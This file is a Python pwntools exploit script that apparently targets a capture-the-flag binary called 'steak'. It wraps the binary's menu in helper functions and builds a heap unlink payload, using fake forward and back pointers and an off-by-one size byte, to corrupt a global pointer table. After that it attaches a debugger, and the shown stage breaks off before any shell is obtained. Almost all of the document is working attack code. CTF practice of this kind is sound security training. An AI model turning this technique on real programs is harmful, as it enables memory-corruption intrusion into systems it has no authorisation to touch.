from pwn import *

p = process('./steak')
elf = ELF('steak')
libc = ELF('libc-2.23.so')
context.log_level = 'debug'

def create(size,content) :
    p.sendlineafter('>\n','1')
    p.sendlineafter('input buf size:\n',str(size))
    p.sendafter('input buf:\n',content)

def delete(index) :
    p.sendlineafter('>\n','2')
    p.sendlineafter('input index:\n',str(index))

def edit(index,size,content) :
    p.sendlineafter('>\n','3')
    p.sendlineafter('input index:\n',str(index))
    p.sendlineafter('input size:\n',str(size))
    p.sendafter('input new buf:\n',content)

def coopy(index1,index2,length) :
    p.sendlineafter('>\n','4')
    p.sendlineafter('input source index:\n',str(index1))
    p.sendlineafter('input dest index:\n',str(index2))
    p.sendlineafter('input copy length:\n',str(length))

create(0x18,'A'*0x18)
create(0x30,'A'*0x18)
create(0xa0,'A'*8)
create(0x10,p64(elf.plt['puts']))

payload = p64(0x0) + p64(0x30) + p64(0x6021a8-0x18) + p64(0x6021a8-0x10)
payload += 'A'*0x10 + p64(0x30) + '\x90'
edit(1,len(payload),payload)
delete(2)
create(0x10,'A')

gdb.attach(p)

p.interactive()
